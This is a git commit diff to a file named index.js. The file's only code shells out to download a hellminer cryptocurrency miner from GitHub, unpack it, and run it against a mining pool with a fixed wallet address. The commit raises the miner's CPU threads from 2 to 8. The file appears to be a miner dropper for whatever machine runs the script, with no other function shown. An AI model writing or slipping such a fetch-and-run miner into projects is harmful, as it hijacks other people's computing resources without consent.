7708f57bed829e79ea3e0989b84524422c47c079
RIFAIGGZ <76506048+itsmeR1F4I@users.noreply.github.com>
2022-05-15 20:29:05 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,2 +1,2 @@
 const { exec, spawn, execSync } = require("child_process")
-exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMu6YbXcRzim4aSJozwuLu5jzaK57jH5ZU.tst -p x --cpu 2')
+exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMu6YbXcRzim4aSJozwuLu5jzaK57jH5ZU.tst -p x --cpu 8')
